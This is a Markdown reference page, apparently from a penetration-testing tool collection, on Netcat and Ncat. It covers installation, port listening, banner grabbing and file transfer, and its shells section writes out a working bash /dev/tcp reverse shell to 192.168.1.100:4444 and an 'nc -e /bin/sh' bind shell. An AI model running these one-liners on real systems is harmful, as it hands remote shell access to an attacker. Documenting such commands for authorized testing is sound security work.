# Netcat (nc)

> The TCP/IP "swiss army knife": open connections, listen on ports, transfer
> files, grab banners, and build ad-hoc shells — all from one tiny binary.

- **Link:** https://nmap.org/ncat/ (Ncat, the modern Nmap rewrite)
- **Type:** open source
- **Platform:** cross-platform (variants: traditional `nc`, OpenBSD `nc`, `ncat`, `socat`)

## Description

Netcat reads and writes data across network connections using TCP or UDP. It's
the duct tape of networking: test whether a port is open, grab a service banner,
move a file between two hosts, stand up a quick chat/relay, or catch a reverse
shell during a pentest. Several implementations exist — Ncat (from the
[Nmap](../recon-scanning/nmap.md) project) adds TLS and is the most
feature-complete.

## Installation

```bash
sudo apt install ncat        # Ncat (recommended); or: sudo apt install netcat-openbsd
```

## Usage examples

```bash
# Listen on a port, verbose, no DNS (-l listen, -v verbose, -n no-DNS, -p port)
nc -lvnp 4444

# Connect to a host/port (test connectivity, talk to a service)
nc -v 192.168.1.10 1234

# Banner grab: send a bare HTTP request and read the response headers
printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -v example.com 80

# Simple two-way chat: server side then client side
nc -lvp 1234                 # listener (acts as a tiny chat server)
nc -v 192.168.1.10 1234      # client connecting to it
```

### File transfer

```bash
# Receiver: listen and write incoming data to a file
nc -lvnp 4444 > received.bin
# Sender: connect and pipe a file in
nc -v 192.168.1.10 4444 < file.bin
```

### Reverse & bind shells (authorized labs only)

```bash
# Reverse shell — listener on the attacker box catches the callback
nc -lvnp 4444
# ...target connects back (no -e needed; works on stock bash):
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Bind shell — target listens with a shell attached, attacker connects in (needs an nc with -e)
nc -lvnp 1234 -e /bin/sh           # run on the TARGET
nc <target_ip> 1234                # attacker connects in
```

## Notes & references

- **Bind shell** = listener on the *victim*; **reverse shell** = listener on the
  *attacker* (reverse shells beat outbound-only firewalls, so they're preferred).
- Many `nc` builds ship *without* `-e` for safety; the `/dev/tcp` bash trick or
  `ncat --exec` / `socat` are the usual replacements.
- Ncat adds `--ssl` for TLS listeners/clients and `--broker` for multi-client
  relays — handy when a service expects encryption.
- Use only against systems you own or are authorized to test. See
  [../exploitation-c2/](../exploitation-c2/) for full C2 frameworks.
